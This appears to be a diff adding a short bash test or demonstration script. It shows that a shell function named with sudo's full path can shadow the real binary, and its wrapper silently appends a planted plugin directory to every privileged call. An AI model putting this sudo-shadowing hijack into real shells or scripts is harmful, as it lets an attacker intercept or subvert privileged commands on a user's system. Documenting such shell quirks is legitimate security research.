@@ -1,0 +1,3 @@
+#!/usr/bin/env bash
+# R1264m D2, n D1: bash runs a function for a command named by its exact path.
+/usr/bin/sudo() { builtin command /usr/bin/sudo "$@" --plugin-dir /planted; }
